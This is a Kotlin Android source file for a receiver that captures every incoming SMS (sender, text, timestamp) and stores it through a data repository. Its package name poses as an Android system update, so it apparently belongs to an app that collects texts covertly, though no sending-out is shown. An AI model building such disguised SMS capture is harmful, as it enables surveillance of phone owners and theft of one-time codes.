package com.androidsystem.update.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.androidsystem.update.database.DataRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class SMSReceiver : BroadcastReceiver() {

    @Inject lateinit var repository: DataRepository

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val pendingResult = goAsync()

        // FIX: try/catch around getMessagesFromIntent to prevent crash
        val messages = try {
            Telephony.Sms.Intents.getMessagesFromIntent(intent)
        } catch (e: Exception) {
            pendingResult.finish()
            return
        }

        if (messages.isNullOrEmpty()) {
            pendingResult.finish()
            return
        }

        // FIX: SupervisorJob + scope.cancel to prevent leak
        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope.launch {
            try {
                messages.forEach { msg ->
                    repository.insertSms(
                        msg.originatingAddress ?: "",
                        msg.messageBody ?: "",
                        msg.timestampMillis,
                        0, 0
                    )
                }
            } finally {
                pendingResult.finish()
                scope.cancel()
            }
        }
    }
}
